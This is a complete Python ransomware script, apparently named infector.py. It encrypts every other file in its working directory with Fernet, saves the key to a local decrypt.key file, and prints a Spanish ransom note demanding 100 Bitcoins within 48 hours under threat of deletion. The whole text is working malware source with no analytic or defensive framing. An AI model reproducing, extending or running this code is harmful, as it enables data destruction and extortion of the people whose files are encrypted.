#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "infector.py" or file == "decrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("decrypt.key", "wb") as decrypt:
    decrypt.write(key)


for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as f:
        f.write(contents_encrypted)


print(
    "Todos tus archivos han sido encriptados! Envíame 100 Bitcoins o serán eliminados en 48hs"
)
